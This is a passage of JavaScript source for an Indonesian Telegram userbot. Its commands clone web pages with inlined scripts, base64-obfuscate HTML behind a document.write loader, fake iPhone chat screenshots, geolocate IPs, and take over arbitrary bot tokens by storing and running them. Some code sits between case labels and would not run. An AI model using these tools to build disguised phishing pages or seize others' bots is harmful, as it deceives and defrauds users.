    await client.sendMessage(message.chatId, {
      message: finalMsg,
      parseMode: "html"
    });
  }
  break;
}

case `${PrefixsCommand}getcode`: {
  const peer = await resolvePeer(client, message);
  if (!peer) return; 
  const reply = message.replyMessage;
  const fromReply = reply?.message || "";
  const args = message.message.split(" ").slice(1).join(" ");
  const rawInput = (fromReply || args || "").trim();
  if (!rawInput) return await client.sendMessage(message.chatId, { message: "<blockquote>❗ Cara pakai:\nBalas pesan link atau ketik\n.gethtml https://contoh.com</blockquote>", parseMode: "html" });
  const url = extractFirstUrl(rawInput);
  if (!url) return await client.sendMessage(message.chatId, { message: "<blockquote>❌ Link tidak valid.</blockquote>", parseMode: "html" });
  const loading = await client.sendMessage(message.chatId, { message: "<blockquote>⏳ Mengambil halaman penuh (inline CSS/JS)…</blockquote>", parseMode: "html" });
  const loadingId = loading.id ?? loading.message?.id;
  try {
    const res = await axios.get(url, { responseType: "text", timeout: 30000, headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept-Language": "en-US,en;q=0.9", "Accept": "text/html,application/xhtml+xml" } });
    let html = res.data;
    const $ = cheerio.load(html);
    const cssLinks = $("link[rel=stylesheet]");
    const scripts = $("script[src]");
    let cssTotal = cssLinks.length, jsTotal = scripts.length, cssDone = 0, jsDone = 0;
    for (let i = 0; i < cssLinks.length; i++) {
      const href = $(cssLinks[i]).attr("href");
      if (href) {
        try {
          const absUrl = new URL(href, url).href;
          const cssRes = await axios.get(absUrl, { timeout: 20000, headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" } });
          $(cssLinks[i]).replaceWith(`<style>\n${cssRes.data}\n</style>`);
        } catch (e) {
          console.log("CSS gagal:", href, e.message);
        }
      }
      cssDone++;
      if (cssDone % 3 === 0 || cssDone === cssTotal) {
        try { await client.editMessage(message.chatId, { message: loadingId, text: `<blockquote>⏳ Mengambil halaman…\nCSS: ${cssDone}/${cssTotal}\nJS: ${jsDone}/${jsTotal}</blockquote>`, parseMode: "html" }); } catch {}
      }
    }
    for (let i = 0; i < scripts.length; i++) {
      const src = $(scripts[i]).attr("src");
      if (src) {
        try {
          const absUrl = new URL(src, url).href;
          const jsRes = await axios.get(absUrl, { timeout: 20000, headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" } });
          $(scripts[i]).replaceWith(`<script>\n${jsRes.data}\n</script>`);
        } catch (e) {
          console.log("JS gagal:", src, e.message);
        }
      }
      jsDone++;
      if (jsDone % 3 === 0 || jsDone === jsTotal) {
        try { await client.editMessage(message.chatId, { message: loadingId, text: `<blockquote>⏳ Mengambil halaman…\nCSS: ${cssDone}/${cssTotal}\nJS: ${jsDone}/${jsTotal}</blockquote>`, parseMode: "html" }); } catch {}
      }
    }
    html = $.html();
    const { hostname } = new URL(url);
    const filename = `${hostname}.html`;
    const savePath = path.join(__dirname, "Temp", filename);
    try { await fs.ensureDir(path.dirname(savePath)); } catch { try { await fs.mkdir(path.dirname(savePath), { recursive: true }); } catch {} }
    await fs.writeFile(savePath, html);
    const sizeKB = (Buffer.byteLength(html) / 1024).toFixed(1);
    const caption = `<blockquote>✅ Berhasil ambil halaman\n🔗 URL: ${url}\n📄 File: ${filename}\n📏 Size: ${sizeKB} KB\n\nSemua CSS & JS sudah inline.</blockquote>`;
    await client.sendFile(message.chatId, { file: savePath, caption, forceDocument: true });
    try { await client.editMessage(message.chatId, { message: loadingId, text: `<blockquote>✅ Selesai. File dikirim: ${filename}</blockquote>`, parseMode: "html" }); } catch {}
    setTimeout(async () => { try { await client.deleteMessages(message.chatId, [loadingId]); } catch {} try { await fs.remove(savePath); } catch {} }, 5000);
  } catch (err) {
    console.error("gethtml error:", err && err.message ? err.message : err);
    try { await client.editMessage(message.chatId, { message: loadingId, text: `<blockquote>❌ Gagal mengambil HTML. Pastikan link bisa diakses publik.</blockquote>`, parseMode: "html" }); } catch { await client.sendMessage(message.chatId, { message: "<blockquote>❌ Gagal mengambil HTML. Pastikan link bisa diakses publik.</blockquote>", parseMode: "html" }); }
  }
  break;
}

case `${PrefixsCommand}enchtml`: {
  const peer = await resolvePeer(client, message);
  if (!peer) return; 
  const replyMsg = await message.getReplyMessage();
  if (!replyMsg || !replyMsg.media || !replyMsg.media.document)
    return await client.sendMessage(message.chatId, {
      message: "<blockquote>❌ REPLY FILE HTML YANG MAU DI ENC</blockquote>",
      parseMode: "html"
    });

  const notice = await client.sendMessage(message.chatId, {
    message: "<blockquote>⏳ Memproses file...</blockquote>",
    parseMode: "html"
  });
  const noticeId = notice.id ?? notice.message?.id;

  try {
    const file = replyMsg.media.document;
    const fileBuffer = await client.downloadMedia(file, { workers: 1 });
    const htmlContent = fileBuffer.toString("utf8");
    const encoded = Buffer.from(htmlContent, "utf8").toString("base64");
    const encryptedHTML = `<!DOCTYPE html><html><head><meta charset="utf-8"/><title>HOREG TEAM</title><script>(function(){try{document.write(atob("${encoded}"))}catch(e){console.error(e)}})();</script></head><body></body></html>`;
    const outputPath = path.join(__dirname, "encrypted.html");
    await fs.writeFile(outputPath, encryptedHTML, "utf8");

    await client.sendFile(message.chatId, {
      file: outputPath,
      caption: "✅ HTML FILE SUKSES DI ENC",
      parseMode: "html",
      forceDocument: true
    });

    await client.editMessage(message.chatId, {
      message: noticeId,
      text: "<blockquote>✅ File berhasil dienkode dan dikirim</blockquote>",
      parseMode: "html"
    });

    setTimeout(async () => {
      try {
        await client.deleteMessages(message.chatId, [noticeId]);
        fs.unlinkSync(outputPath);
      } catch {}
    }, 4000);
  } catch (e) {
    console.error(e);
    await client.editMessage(message.chatId, {
      message: noticeId,
      text: "<blockquote>❌ ERROR SAAT MEMPROSES</blockquote>",
      parseMode: "html"
    });
  }
  break;
}

case `${PrefixsCommand}iqc`: {
  const peer = await resolvePeer(client, message);
  if (!peer) return; 
  if (!args || !args[0])
    return client.sendMessage(message.chatId, {
      message: "<blockquote>⚠️ Gunakan: .iqc jam|batre|carrier|pesan\nContoh: .iqc 18:00|40|Indosat|hai hai</blockquote>",
      parseMode: "html"
    });

  const input = args.join(" ");
  const [time, battery, carrier, ...msg] = input.split("|");
  if (!time || !battery || !carrier || msg.length === 0)
    return client.sendMessage(message.chatId, {
      message: "<blockquote>⚠️ Format salah! Gunakan:\n.iqc jam|batre|carrier|pesan\nContoh:\n.iqc 18:00|40|Indosat|hai hai</blockquote>",
      parseMode: "html"
    });

  const wait = await client.sendMessage(message.chatId, {
    message: "<blockquote>⏳ Tunggu sebentar...</blockquote>",
    parseMode: "html"
  });

  try {
    const messageText = encodeURIComponent(msg.join("|").trim());
    const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(carrier)}&messageText=${messageText}&emojiStyle=apple`;

    const res = await fetch(url);
    if (!res.ok)
      return client.sendMessage(message.chatId, {
        message: "<blockquote>❌ Gagal mengambil data dari API.</blockquote>",
        parseMode: "html"
      });

    const buffer = Buffer.from(await res.arrayBuffer());
    if (!buffer.length)
      return client.sendMessage(message.chatId, {
        message: "<blockquote>❌ Gambar kosong dari API.</blockquote>",
        parseMode: "html"
      });

    const tempPath = "./iqc_temp.jpg";
    fs.writeFileSync(tempPath, buffer);

    await client.sendFile(message.chatId, {
      file: tempPath,
      caption: `<blockquote>✅ Sukses!\nJam: ${time}\nBatre: ${battery}%\nCarrier: ${carrier}\nPesan: ${msg.join(" ")}</blockquote>`,
      parseMode: "html",
      forceDocument: false
    });

    try { fs.unlinkSync(tempPath); } catch {}

  } catch (err) {
    console.error("IQC Error:", err);
    await client.sendMessage(message.chatId, {
      message: "<blockquote>❌ Terjadi kesalahan saat menghubungi API.</blockquote>",
      parseMode: "html"
    });
  } finally {
    try { await client.deleteMessages(message.chatId, [wait.id]); } catch {}
  }
  break;
}
case `${PrefixsCommand}profile`:
case `${PrefixsCommand}getinfo`: {
  const peer = await resolvePeer(client, message);
  if (!peer) return; 
  const replyMsg = await message.getReplyMessage();
  if (!replyMsg) return await client.sendMessage(message.chatId, {
    message: "<blockquote>❌ REPLY pesan orang yang ingin diambil profilnya</blockquote>",
    parseMode: "html"
  });

  const wait = await client.sendMessage(message.chatId, {
    message: "<blockquote>⏳ Mengambil data profil...</blockquote>",
    parseMode: "html"
  });
  const waitId = wait.id ?? wait.message?.id;

  try {
    const userId = replyMsg.senderId || replyMsg.fromId?.userId || replyMsg.peerId?.userId;
    if (!userId) throw new Error("noid");

    const entity = await client.getEntity(userId);
    const firstName = entity.firstName || "-";
    const lastName = entity.lastName || "-";
    const username = entity.username ? "@" + entity.username : "-";
    const tgId = entity.id || userId;

    let profilePhotoBuffer = null;
    try {
      const photos = await client.getUserPhotos(userId, { limit: 1 });
      if (photos.length > 0) profilePhotoBuffer = await client.downloadMedia(photos[0], { workers: 1 });
    } catch {}

    const caption = `<blockquote>
💎 User Info
👤 Name       : ${firstName} ${lastName}
📛 Username   : ${username}
🆔 Telegram ID: ${tgId}
</blockquote>`;

    if (profilePhotoBuffer) {
      let mime = "image/jpeg";
      if (profilePhotoBuffer[0] === 0x89 && profilePhotoBuffer[1] === 0x50 && profilePhotoBuffer[2] === 0x4e && profilePhotoBuffer[3] === 0x47) mime = "image/png";
      await client.sendFile(message.chatId, { file: profilePhotoBuffer, caption, parseMode: "html", forceDocument: false, mimeType: mime });
    } else {
      await client.sendMessage(message.chatId, { message: caption, parseMode: "html" });
    }

  } catch {
    await client.sendMessage(message.chatId, {
      message: "<blockquote>❌ Gagal mengambil profil user</blockquote>",
      parseMode: "html"
    });
  } finally {
    try { await client.deleteMessages(message.chatId, [waitId]); } catch {}
  }

  break;
}

case `${PrefixsCommand}ai`: {
  const peer = await client.getInputEntity(message.chatId);
  const text = message.text.split(" ").slice(1).join(" ");
  if (!text) return await client.sendMessage(peer, { message: "<blockquote>⚠️ Masukkan pertanyaan setelah .ai</blockquote>", parseMode: "html" });
  const sent = await client.sendMessage(peer, { message: "<blockquote>⏳ Sedang berpikir...</blockquote>", parseMode: "html" });
  try {
    const res = await axios.post(
      `${settings.API_URL}?key=${settings.API_KEY}`,
      { contents: [{ parts: [{ text }] }] },
      { headers: { "Content-Type": "application/json" } }
    );
    const reply = res.data.candidates?.[0]?.content?.parts?.[0]?.text || "⚠️ Tidak ada respon.";
    await client.editMessage(peer, { message: sent.id, text: `<blockquote>${reply}</blockquote>`, parseMode: "html" });
  } catch (e) {
    await client.editMessage(peer, { message: sent.id, text: `<blockquote>❌ Error: ${e.message}</blockquote>`, parseMode: "html" });
  }
  break;
}

case `${PrefixsCommand}iptrack`: {
  const peer = await resolvePeer(client, message);
  if (!peer) return; 
  if (Number(message.senderId) !== ownerId) break;
  const ip = message.message.split(" ")[1];
  if (!ip) { await client.sendMessage(message.chatId, { message: "<blockquote>❌ Contoh: .iptrack 1.1.1.1</blockquote>", parseMode: "html", replyTo: message.id }); break; }
  if (!net.isIP(ip)) { await client.sendMessage(message.chatId, { message: "<blockquote>❌ IP tidak valid!</blockquote>", parseMode: "html", replyTo: message.id }); break; }
  await client.sendMessage(message.chatId, { message: "<blockquote>⏳ Mengecek informasi IP...</blockquote>", parseMode: "html", replyTo: message.id });
  try {
    const { data } = await axios.get(`http://ip-api.com/json/${ip}?fields=66846719`);
    if (data.status !== "success") throw new Error(data.message || "Unknown error");
    const reply = `<blockquote><b>📡 Informasi IP: ${ip}</b></blockquote>
<pre>🌍 Negara    : ${data.country || "-"} (${data.countryCode || "-"})</pre>
<pre>🏙️ Kota      : ${data.city || "-"}</pre>
<pre>🏞️ Region    : ${data.regionName || "-"}</pre>
<pre>📌 Koordinat : ${data.lat || "-"}, ${data.lon || "-"}</pre>
<pre>🏢 ISP       : ${data.isp || "-"}</pre>
<pre>🔗 Org       : ${data.org || "-"}</pre>
<pre>🛰️ ASN       : ${data.as || "-"}</pre>
<pre>🕹️ Timezone  : ${data.timezone || "-"}</pre>
<pre>🏡 Reverse   : ${data.reverse || "-"}</pre>
<pre>🌐 Proxy/VPN : ${data.proxy} | Hosting: ${data.hosting}</pre>`;
    await client.sendMessage(message.chatId, { message: reply, parseMode: "html", replyTo: message.id });
  } catch (e) {
    await client.sendMessage(message.chatId, { message: `<blockquote>❌ Error:\n${e.message || e}</blockquote>`, parseMode: "html", replyTo: message.id });
  }
  break;
}

case `${PrefixsCommand}cekip`: {
  const peer = await resolvePeer(client, message);
  if (!peer) return; 
  if (Number(message.senderId) !== ownerId) break;
  let input_url = message.message.split(" ").slice(1).join(" ").trim();
  if (!input_url) { await client.sendMessage(message.chatId, { message: "<blockquote>❌ Contoh: .cekip https://example.com</blockquote>", parseMode: "html", replyTo: message.id }); break; }
  if (!input_url.startsWith("http")) input_url = "https://" + input_url;
  try {
    const start = Date.now();
    const res = await axios.get(input_url, { timeout: 5000 });
    const duration = Date.now() - start;
    const final_url = (res.request && res.request.res && res.request.res.responseUrl) || input_url;
    const parsed = new URL(final_url);
    const hostname = parsed.hostname;
    let ip = "-";
    try { ip = (await dns.lookup(hostname)).address; } catch {}
    const reply = `<blockquote><b>🔍 ${hostname}</b></blockquote>
<pre>📡 IP       : ${ip}</pre>
<pre>🔗 Redirect : ${final_url === input_url ? "-" : final_url}</pre>
<pre>📝 Status   : ${res.status} ${res.statusText}</pre>
<pre>📄 Type     : ${res.headers["content-type"] || "-"}</pre>
<pre>📦 Size     : ${res.headers["content-length"] || "-"}</pre>
<pre>🚀 Server   : ${res.headers.server || "-"}</pre>
<pre>⚙️ Powered  : ${res.headers["x-powered-by"] || "-"}</pre>
<pre>⏱️ Speed    : ${duration} ms</pre>
<pre>🛡️ HTTPS    : ${final_url.startsWith("https") ? "✅ Yes" : "❌ No"}</pre>
<pre>🧠 Cache    : ${res.headers["cache-control"] || "-"}</pre>
<pre>🌐 URL      : ${input_url}</pre>`;
    await client.sendMessage(message.chatId, { message: reply, parseMode: "html", replyTo: message.id });
  } catch (e) {
    await client.sendMessage(message.chatId, { message: `<blockquote>❌ Gagal cek URL: ${e.message || e}</blockquote>`, parseMode: "html", replyTo: message.id });
  }
  break;
}

case `${PrefixsCommand}done`: {
  const peer = await resolvePeer(client, message);
  if (!peer) return; 
  if (Number(message.senderId) !== ownerId) break;
  const text = message.message.split(" ").slice(1).join(" ");
  if (!text.includes(",")) { await client.sendMessage(message.chatId, { message: "<blockquote>⚠️ Format salah! Gunakan: .done barang,harga[,pembayaran]</blockquote>", parseMode: "html", replyTo: message.id }); break; }
  const parts = text.split(",");
  const name_item = parts[0].trim();
  const price = parts[1].trim();
  const payment = parts[2] ? parts[2].trim() : "Lainnya";
  const time = new Date().toISOString().replace("T", " ").split(".")[0];
  const reply = `<blockquote>「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」</blockquote>
<blockquote>📦 <b>ʙᴀʀᴀɴɢ : ${name_item}</b>\n💸 <b>ɴᴏᴍɪɴᴀʟ : ${price}</b>\n🕰️ <b>ᴡᴀᴋᴛᴜ : ${time}</b>\n💳 <b>ᴘᴀʏᴍᴇɴᴛ : ${payment}</b></blockquote>
<blockquote>ᴛᴇʀɪᴍᴀᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴏʀᴅᴇʀ</blockquote>`;
  await client.sendMessage(message.chatId, { message: reply, parseMode: "html", replyTo: message.id });
  break;
}

case `${PrefixsCommand}liston`: {
  const peer = await resolvePeer(client, message);
  if (!peer) return; 
  if (Number(message.senderId) !== ownerId) break;
  if (!message.isGroup) { await client.sendMessage(message.chatId, { message: "<blockquote>⚠️ Command ini hanya bisa di group!</blockquote>", parseMode: "html", replyTo: message.id }); break; }
  try {
    const channel = await client.getInputEntity(message.chatId);
    const result = await client.invoke(new Api.channels.GetParticipants({ channel, filter: new Api.ChannelParticipantsRecent(), offset: 0, limit: 200, hash: 0 }));
    if (!result.users || result.users.length === 0) { await client.sendMessage(message.chatId, { message: "<blockquote>📭 Tidak ada member di grup ini.</blockquote>", parseMode: "html", replyTo: message.id }); break; }
    const members = result.users.map(user => {
      const name = [user.firstName, user.lastName].filter(Boolean).join(" ") || user.username || String(user.id);
      let statusText = "❔ Tidak diketahui";
      if (user.status) {
        switch (user.status.className) {
          case "UserStatusOnline": statusText = "🟢 Online"; break;
          case "UserStatusOffline": statusText = `⚫ Offline (terakhir ${new Date(user.status.wasOnline * 1000).toLocaleString()})`; break;
          case "UserStatusRecently": statusText = "🟡 Terakhir online baru-baru ini"; break;
          case "UserStatusLastWeek": statusText = "🟠 Terakhir online minggu lalu"; break;
          case "UserStatusLastMonth": statusText = "🔴 Terakhir online bulan lalu"; break;
          case "UserStatusEmpty": statusText = "⚪ Status disembunyikan"; break;
        }
      }
      return `• ${name}\n<blockquote>${statusText}</blockquote>`;
    });
    const reply = `<b>👥 Daftar Member + Status:</b>\n\n` + members.join("\n\n");
    await client.sendMessage(message.chatId, { message: reply, parseMode: "html", replyTo: message.id });
  } catch (e) {
    await client.sendMessage(message.chatId, { message: `<blockquote>❌ Gagal mengambil data: ${e}</blockquote>`, parseMode: "html", replyTo: message.id });
  }
  break;
}

case `${PrefixsCommand}tt`: {
  const peer = await resolvePeer(client, message);
  if (!peer) return; 
    const query = message.message.split(" ").slice(1).join(" ");
    if (!query) break;

    const wait = await client.sendMessage(message.chatId, { message: "⏳ Memproses video TikTok..." });

    try {
        const data = await tiktok2(query);
        if (!data.no_watermark) throw new Error("Video tanpa watermark tidak ditemukan.");

        const captionText = `<blockquote>
<b>${escapeHtml(data.title || "Untitled")}</b>

👤 <b>Author:</b> ${escapeHtml(data.author?.nickname || "N/A")}
🎵 <b>Music:</b> ${escapeHtml(data.music?.title || "N/A")} - ${escapeHtml(data.music?.author || "N/A")}
</blockquote>`;

        const axios = require("axios");

        const vResp = await axios.get(data.no_watermark, { responseType: "arraybuffer", timeout: 60000 });
        let videoBuffer = Buffer.from(vResp.data);
        videoBuffer.name = "video.mp4";

        let thumbBuffer;
        if (data.cover) {
            try {
                const tResp = await axios.get(data.cover, { responseType: "arraybuffer", timeout: 20000 });
                thumbBuffer = Buffer.from(tResp.data);
                thumbBuffer.name = "thumb.jpg";
            } catch (e) {
                thumbBuffer = undefined;
            }
        }

        const videoAttrs = [
            new Api.DocumentAttributeVideo({
                duration: data.duration || 0,
                w: data.width || 0,
                h: data.height || 0,
                supportsStreaming: true
            })
        ];

        await client.sendFile(message.chatId, {
            file: videoBuffer,
            caption: captionText,
            parseMode: "html",
            replyTo: message.id,
            thumb: thumbBuffer,
            attributes: videoAttrs,
            supportsStreaming: true,
            forceDocument: false,
            workers: 1
        });

    } catch (err) {
        await client.editMessage(message.chatId, {
            message: wait.id,
            text: `❌ <b>Gagal memproses video.</b>\nPesan Error: ${escapeHtml(err.message || String(err))}`,
            parseMode: "html"
        });
        return;
    }

    await client.deleteMessages(message.chatId, [wait.id], { revoke: true });
    break;
}
const store = settings.storename;
case `${PrefixsCommand}payment`:
case `${PrefixsCommand}pay`:
case `${PrefixsCommand}paymen`: {
    const peer = await resolvePeer(client, message);
    if (!peer) return;

    const caption = `<blockquote>
<b>Hi lakukan pembayaran lebih mudah dan lengkap pilihan metode di bawah ini</b>

<b>♻️Metode Payment By <u>${store}</u> Pilih di bawah ini </b>

 ❖ ᴅᴀɴᴀ : <code><spoiler>${settings.dana}</spoiler></code>
 ❖ ɢᴏᴘᴀʏ : <code><spoiler>${settings.gopay}</spoiler></code>
 ❖ ᴏᴠᴏ  : <code><spoiler>${settings.ovo}</spoiler></code>
 ❖ ǫʀɪs : anda dapat melakukan scan qris di foto atas ini atau bisa lakukan pembayaran <a href="${settings.qrs}">Disini</a> agar lebih efisien
</blockquote>`;

    try {
        await client.sendMessage(peer, {
            message: caption,
            file: settings.qrs,
            parseMode: "html"
        });
    } catch {}
    break;
}


async function resolvePeer(client, message) {
    try {
        if (message.chatId) return await client.getInputEntity(message.chatId);
        if (message.senderId) return await client.getInputEntity(message.senderId);
        return null;
    } catch { return null; }
}

case `${PrefixsCommand}trackbot`: {
  const args = message.message.split(" ").slice(1);
  const token = args[0];
  if (!token)
    return await client.sendMessage(message.chatId, {
      message: "<blockquote>⚠️ Format: .trackbot &lt;token&gt;</blockquote>",
      parseMode: "html",
      replyTo: message.id
    });

  const escapeHtml = t =>
    String(t || "")
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;");

  try {
    const { Telegraf } = require("telegraf");
    const tmp = new Telegraf(token);

    let info;
    try {
      info = await tmp.telegram.getMe();
    } catch (e) {
      await client.sendMessage(message.chatId, {
        message: `<blockquote>❌ Token tidak valid atau bot tidak aktif.\n\n🪵 <b>DEBUG:</b> ${escapeHtml(String(e.message || e))}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
      try { await tmp.stop(); } catch {}
      return;
    }

    const botUser = info.username || `bot_${info.id}`;
    const botId = info.id;
    const botName = info.first_name || "-";
    const bioInfo = await tmp.telegram.getMyDescription().catch(() => ({}));
    const bio = bioInfo?.description || "-";
    const canJoin = typeof info.can_join_groups !== "undefined" ? "✅ Yes" : "❌ No";
    const inline = typeof info.supports_inline_queries !== "undefined" ? "✅ Yes" : "❌ No";

    const botJsonPath = path.join(tokenDir, `${botUser}.json`);
    if (!fs.existsSync(botJsonPath)) {
      const data = { id: botId, username: botUser, name: botName, token };
      fs.writeFileSync(botJsonPath, JSON.stringify(data, null, 2));
    }

    let activationStatus = "✅ Bot sudah aktif";
    try {
      if (!activeBots.has(botUser)) await createBot(token); // aktifkan bot
    } catch (e) {
      activationStatus = `❌ Gagal aktifkan bot: ${escapeHtml(String(e.message || e))}`;
    }

    const finalText = `<blockquote>
🤖 <b>Nama:</b> ${escapeHtml(botName)}
• <b>Username:</b> <code>@${escapeHtml(botUser)}</code>
• <b>ID:</b> <code>${escapeHtml(String(botId))}</code>

📄 <b>Bio:</b>
${escapeHtml(bio)}

⚙️ <b>Capabilities</b>
• can_join_groups: <b>${canJoin}</b>
• supports_inline_queries: <b>${inline}</b>

📦 <b>Database:</b> ${fs.existsSync(botJsonPath) ? "✅ Tersimpan" : "❌ Belum tersimpan"}
⚡ <b>Aktivasi:</b> ${activationStatus}
</blockquote>`;

    await client.sendMessage(message.chatId, {
      message: finalText,
      parseMode: "html",
      replyTo: message.id
    });

    try { await tmp.stop(); } catch {}
  } catch (err) {
    await client.sendMessage(message.chatId, {
      message: `<blockquote>❌ Terjadi kesalahan: ${escapeHtml(String(err.message || err))}</blockquote>`,
      parseMode: "html",
      replyTo: message.id
    });
  }

  break;
}

// ===== CASE LIST TOKEN =====
case `${PrefixsCommand}listtoken`: {
  const escapeHtml = t => String(t || "").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");

  try {
    if (!fs.existsSync(tokenDir)) {
      return await client.sendMessage(message.chatId, { 
        message: "<blockquote>⚠️ Belum ada token tersimpan.</blockquote>", 
        parseMode: "html" 
      });
    }

    const files = fs.readdirSync(tokenDir).filter(f => f.endsWith(".json"));
    if (files.length === 0) {
      return await client.sendMessage(message.chatId, { 
        message: "<blockquote>⚠️ Belum ada token tersimpan.</blockquote>", 
        parseMode: "html" 
      });
    }

    let text = `<blockquote>📂 Daftar Token Bot Aktif / Tersimpan:\n\n`;
    files.forEach((f, i) => {
      const p = path.join(tokenDir, f);
      const raw = JSON.parse(fs.readFileSync(p, "utf8"));
      const username = raw.username || `bot_${raw.id}`;
      const id = raw.id || "-";
      const status = activeBots.has(username) ? "Running ✅" : "Offline ❌";
      text += `${i+1}. @${escapeHtml(username)} (ID: ${escapeHtml(String(id))}) - Status: ${status}\n`;
    });
    text += `</blockquote>`;

    await client.sendMessage(message.chatId, { message: text, parseMode: "html" });
  } catch (err) {
    await client.sendMessage(message.chatId, { 
      message: `<blockquote>❌ Terjadi kesalahan: ${escapeHtml(String(err.message || err))}</blockquote>`, 
      parseMode: "html" 
    });
  }
  break;
}

// ===== CASE DELETE TOKEN =====
case `${PrefixsCommand}deltoken`: {
  const escapeHtml = t => String(t || "").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
  const args = message.message.split(" ").slice(1);
  const target = args[0];

  if (!target) return await client.sendMessage(message.chatId, {
    message: "<blockquote>⚠️ Format: .deltoken &lt;username atau id&gt;</blockquote>", parseMode: "html"
  });

  try {
    if (!fs.existsSync(tokenDir)) return await client.sendMessage(message.chatId, {
      message: "<blockquote>⚠️ Tidak ada token tersimpan.</blockquote>", parseMode: "html"
    });

    const files = fs.readdirSync(tokenDir).filter(f => f.endsWith(".json"));
    let found = false;

    for (const f of files) {
      const p = path.join(tokenDir, f);
      const raw = JSON.parse(fs.readFileSync(p, "utf8"));
      const username = raw.username || `bot_${raw.id}`;
      const id = String(raw.id);

      if (username.toLowerCase() === target.toLowerCase() || id === target) {
        found = true;

        // Stop bot kalau aktif
        if (activeBots.has(username)) {
          try { await activeBots.get(username).stop(); } catch {}
          activeBots.delete(username);
        }

        fs.unlinkSync(p);

        await client.sendMessage(message.chatId, {
          message: `<blockquote>🗑️ Bot <b>@${escapeHtml(username)}</b> (ID: <code>${escapeHtml(id)}</code>) berhasil dihapus dari database dan dihentikan jika aktif.</blockquote>`,
          parseMode: "html"
        });
        break;
      }
    }

    if (!found) {
      await client.sendMessage(message.chatId, {
        message: `<blockquote>⚠️ Bot "${escapeHtml(target)}" tidak ditemukan di database.</blockquote>`,
        parseMode: "html"
      });
    }

  } catch (err) {
    await client.sendMessage(message.chatId, { 
      message: `<blockquote>❌ Terjadi kesalahan: ${escapeHtml(String(err.message || err))}</blockquote>`, 
      parseMode: "html" 
    });
  }
  break;
}

/*
case ".button": {
  try {
    await client.sendMessage(message.chatId, {
      message: "<i>Membuka menu inline...</i>",
      parseMode: "html",
    });
    const { botReady } = require("./Dokumentasi/BotApi/JunOfficial.Api.js");
    const botUsername = await botReady;
    
    const results = await client.invoke(
      new Api.messages.GetInlineBotResults({
        bot: botUsername,
        peer: message.chatId,
        query: "OPEN MENU",
        offset: "",
      })
    );

    if (!results || !results.results || results.results.length === 0) {
      throw new Error("Bot inline tidak memberikan hasil. Pastikan query 'OPEN MENU' sudah benar dan bot online.");
    }
    
    await client.invoke(
      new Api.messages.SendInlineBotResult({
        peer: message.chatId,
        queryId: results.queryId,
        id: results.results[0].id,
        hideVia: true,
        replyTo: message.id,
      })
    );

  } catch (e) {
    console.error("Error pada perintah .button:", e);
    await client.sendMessage(message.chatId, {
      message: `<blockquote><b>❌ Gagal memanggil menu inline.</b>\n\n<b>Error:</b> ${e.message}</blockquote>`,
      parseMode: "html",
      replyTo: message.id,
    });
  }
  break;
}

Jangan di aktifkan kalo gamau error fatal
*/

default:
  await client.sendMessage(message.chatId, { message: `<blockquote>❓ Command tidak dikenal!</blockquote>`, parseMode: "html" });
  break;
}
  }, new NewMessage({ outgoing: true }));
})();